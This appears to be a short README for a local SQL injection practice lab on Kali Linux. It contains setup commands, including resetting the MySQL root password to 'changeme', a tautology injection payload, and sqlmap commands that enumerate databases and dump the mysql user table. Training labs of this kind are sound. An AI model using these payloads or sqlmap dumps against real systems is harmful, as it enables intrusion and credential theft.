on fresh installed linux kali 1.0.9a do:

sudo -s

apt-get install gedit phpmyadmin;

cd /var/www/;
git clone https://github.com/loeken/sqlinjection_examples;

cd sqlinjection_examples;
service mysql start;
use mysql;
update user set password=PASSWORD("changeme") where User='root';
flush privileges;
create database sqlinjection_examples;
use sqlinjection_examples;
source schema.sql;

example dork username=asdf' or '1'='1

sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= --dbs

sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= -D mysql --tables

sqlmap -u http://localhost/sqlinjection_examples/example1.php?username= -D mysql -T user --dump


